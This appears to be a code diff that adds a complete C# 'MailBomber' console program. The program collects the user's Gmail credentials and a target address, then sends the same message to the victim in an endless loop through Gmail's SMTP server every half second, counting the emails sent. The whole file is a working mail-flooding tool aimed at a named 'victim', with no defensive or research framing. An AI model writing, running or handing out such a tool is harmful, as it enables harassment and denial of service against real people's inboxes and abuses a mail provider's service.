@@ -1,0 +1,63 @@
+using System;
+using System.Text;
+using System.Threading;
+using System.Net.Mail;
+
+
+namespace MailBomber
+{
+    class Mailbomber
+    {
+        public static void Main(string[] args)
+        {
+            Console.WriteLine("What is your gmail ?");
+            string email = Console.ReadLine();
+
+            Console.WriteLine("Who is the target");
+            string victim = Console.ReadLine();
+
+            Console.WriteLine("What is the mail subject");
+            string Subject = Console.ReadLine();
+
+            Console.WriteLine("What is the email message ? :");
+            string body = Console.ReadLine();
+
+            Console.WriteLine("What is your gmail password");
+            string password = Console.ReadLine();
+
+            doSpam(email, victim, Subject, body, password);
+        }
+
+        public static void doSpam(string email, string victim, string subject, string body, string password)
+        {
+            new Thread(() =>
+            {
+                int i = 0;
+                while (true)
+                {
+                    
+                    MailMessage mail = new MailMessage();
+                    SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
+
+                    mail.From = new MailAddress(email);
+                    mail.To.Add(victim);
+                    mail.Subject = subject +i;
+                    mail.Body = body;
+
+                    SmtpServer.Port = 587;
+                    SmtpServer.Credentials = new System.Net.NetworkCredential(email, password);
+                    SmtpServer.EnableSsl = true;
+
+                    SmtpServer.Send(mail);
+
+
+                    Thread.Sleep(500);
+                    i++;
+                    Console.WriteLine("Amounts of emails send {0}", i);
+                    
+                }
+
+            }).Start();
+        }
+    }
+}
